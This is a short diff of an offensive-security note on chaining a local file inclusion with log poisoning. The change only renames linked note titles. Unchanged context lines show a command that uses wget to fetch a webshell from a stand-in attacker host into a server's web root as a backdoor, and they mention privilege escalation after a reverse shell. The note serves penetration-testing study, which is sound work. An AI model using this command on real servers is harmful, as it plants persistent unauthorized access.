@@ -131,10 +131,10 @@ During a penetration test on a legacy CMS, the tester discovered an LFI in the p
   ```
 
 ## Chaining Opportunities
-- This vuln + [[22.02 Unrestricted File Upload — Webshell Upload]] → If the log files are too large and parsing them times out the server, use log poisoning to execute a command that downloads a tiny, clean webshell into the web root (e.g., `cmd=wget http://attacker.com/shell.txt -O /var/www/html/shell.php`), giving you a permanent, clean backdoor.
+- This vuln + [[02 - Unrestricted File Upload — Webshell Upload]] → If the log files are too large and parsing them times out the server, use log poisoning to execute a command that downloads a tiny, clean webshell into the web root (e.g., `cmd=wget http://attacker.com/shell.txt -O /var/www/html/shell.php`), giving you a permanent, clean backdoor.
 - This vuln + [[Missing File Permissions / Sudo Privileges]] → Once the reverse shell is established via log poisoning, begin local privilege escalation to root.
 
 ## Related Notes
-- [[23.05 Local File Inclusion (LFI)]]
-- [[23.08 LFI to RCE via /proc/self/environ]]
-- [[23.09 LFI to RCE via PHP Session File]]
+- [[05 - Local File Inclusion (LFI)]]
+- [[08 - LFI to RCE via _proc_self_environ]]
+- [[09 - LFI to RCE via PHP Session File]]
